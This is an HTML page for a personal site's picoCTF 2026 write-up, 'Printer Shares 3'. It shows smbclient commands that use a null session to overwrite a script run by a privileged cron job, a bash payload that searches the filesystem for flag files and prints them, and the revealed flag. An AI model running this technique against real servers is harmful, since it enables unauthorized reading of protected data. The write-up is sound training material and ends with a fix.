@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Printer Shares 3 — Writeup — Dos Vathanak Botra</title>
+<meta name="description" content="A world-writable SMB share feeds a privileged cron job — overwrite its script to read a protected flag. A picoCTF general-skills writeup.">
+<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;600;700;900&family=IBM+Plex+Mono:wght@300;400;500;600&family=Rajdhani:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../../css/base.css">
+<link rel="stylesheet" href="../../css/nav.css">
+<link rel="stylesheet" href="../../css/footer.css">
+<link rel="stylesheet" href="../../css/animations.css">
+<link rel="stylesheet" href="../../css/responsive.css">
+<link rel="stylesheet" href="../writeups.css">
+</head>
+<body>
+
+<div class="grid-bg"></div>
+<div class="scanlines"></div>
+
+<nav id="navbar">
+  <a href="../../index.html" class="nav-logo">DVB.SEC</a>
+  <ul class="nav-links" id="navLinks">
+    <li><a href="../../index.html#about">About</a></li>
+    <li><a href="../../index.html#skills">Skills</a></li>
+    <li><a href="../../index.html#experience">Experience</a></li>
+    <li><a href="../../index.html#certificates">Certs</a></li>
+    <li><a href="../index.html">Writeups</a></li>
+    <li><a href="../../index.html#contact">Contact</a></li>
+  </ul>
+  <div class="nav-right">
+    <button class="theme-toggle" id="themeToggle" onclick="toggleTheme()">
+      <span id="themeIcon">☀️</span> <span id="themeLabel">Light</span>
+    </button>
+    <div class="hamburger" id="hamburger" onclick="toggleMenu()">
+      <span></span><span></span><span></span>
+    </div>
+  </div>
+</nav>
+
+<main class="wu-main">
+  <a href="../index.html" class="wu-back">← All writeups</a>
+
+  <div class="wu-report-head">
+    <span class="badge cat-general">General Skills</span>
+    <span class="diff diff-hard">Hard</span>
+  </div>
+  <h1 class="wu-page-title">Printer Shares 3</h1>
+  <p class="wu-meta-line"><b>picoCTF 2026</b> · General Skills · Hard</p>
+
+  <dl class="wu-glance reveal">
+    <div><dt>Vulnerability</dt><dd>Writable share + privileged cron</dd></div>
+    <div><dt>Impact</dt><dd>Read a flag our session can't reach</dd></div>
+    <div><dt>Tools</dt><dd>smbclient, a bash payload</dd></div>
+    <div><dt>Access</dt><dd>Anonymous / null SMB session</dd></div>
+  </dl>
+
+  <div class="wu-flag-wrap">
+    FLAG&nbsp; <span class="wu-flag" title="click to reveal" role="button" tabindex="0">academy{5mb_pr1nter_5h4re5_r3v3r53_3222ebc1}</span>
+    <span class="wu-flag-hint">(click to reveal)</span>
+  </div>
+
+  <div class="wu-body">
+    <h2>Summary</h2>
+    <p>An SMB server exposes two shares: a public, writable one (null session) holding a <code>script.sh</code> + <code>cron.log</code>, and a protected <code>secure-shares</code> we can't read. A cron job runs <code>script.sh</code> <strong>every minute as a privileged user</strong> and appends its output to the world-readable <code>cron.log</code>. Since we can overwrite the script, we make it read the flag for us.</p>
+    <div class="wu-insight"><p>Don't attack the locked door — use the thing that already has the key. The cron user can read <code>secure-shares</code>; we just change what it runs.</p></div>
+    <h2>Recon</h2>
+    <div class="wu-code">
+      <div class="wu-code-head"><span>shell</span><button class="wu-copy">copy</button></div>
+<pre><code>smbclient -L //$H -p $P -N
+#  shares          Disk   Public Share With Guests        <- writable (null session)
+#  secure-shares   Disk   Printer for internal usage only <- ACCESS_DENIED to us
+
+smbclient //$H/shares -p $P -N -c 'get script.sh; get cron.log'
+# script.sh = a harmless health check; cron.log gains one line per minute</code></pre>
+    </div>
+    <h2>The payload</h2>
+    <p>Rather than guess the flag's path, the replacement script enumerates and cats any <code>flag*</code> file, so the exact path doesn't matter:</p>
+    <div class="wu-code">
+      <div class="wu-code-head"><span>bash</span><button class="wu-copy">copy</button></div>
+<pre><code>#!/bin/bash
+echo "Health Check: $(date)"
+echo "WHOAMI: $(id)"
+for f in $(find / -iname 'flag*' 2>/dev/null); do echo "&gt;&gt; $f"; cat "$f" 2>&amp;1; done</code></pre>
+    </div>
+    <div class="wu-code">
+      <div class="wu-code-head"><span>shell</span><button class="wu-copy">copy</button></div>
+<pre><code>smbclient //$H/shares -p $P -N -c 'put script.sh'   # overwrite, then wait ~60s</code></pre>
+    </div>
+    <h2>Result</h2>
+    <p>After the next tick, the flag appeared in <code>cron.log</code> among the <code>find</code> output:</p>
+    <div class="wu-code">
+      <div class="wu-code-head"><span>text</span><button class="wu-copy">copy</button></div>
+<pre><code>>> /challenge/secure-shares/flag.txt
+academy{5mb_pr1nter_5h4re5_r3v3r53_3222ebc1}</code></pre>
+    </div>
+    <h2>Takeaways</h2>
+    <ul>
+      <li><strong>Let the privileged job do the work</strong> instead of attacking the protected share directly.</li>
+      <li><strong>Enumerate, don't guess</strong> — <code>find / -iname 'flag*'</code> + cat-all made the path irrelevant.</li>
+      <li><strong>The output channel was free</strong> — cron already logs stdout to a readable file.</li>
+      <li>Fix: cron scripts should be root-owned and <strong>not writable</strong> by anonymous users.</li>
+    </ul>
+
+  </div>
+</main>
+
+<footer>
+  <div class="footer-name">DOS VATHANAK BOTRA</div>
+  <div class="footer-copy">© 2025 Dos Vathanak Botra. All rights reserved. · Phnom Penh, Cambodia</div>
+  <div class="footer-links">
+    <a href="../../index.html#hero">Home</a>
+    <a href="../index.html">Writeups</a>
+    <a href="../../index.html#contact">Contact</a>
+  </div>
+</footer>
+
+<script src="../../js/theme.js"></script>
+<script src="../../js/nav.js"></script>
+<script src="../../js/scroll.js"></script>
+<script src="../writeups.js"></script>
+</body>
+</html>
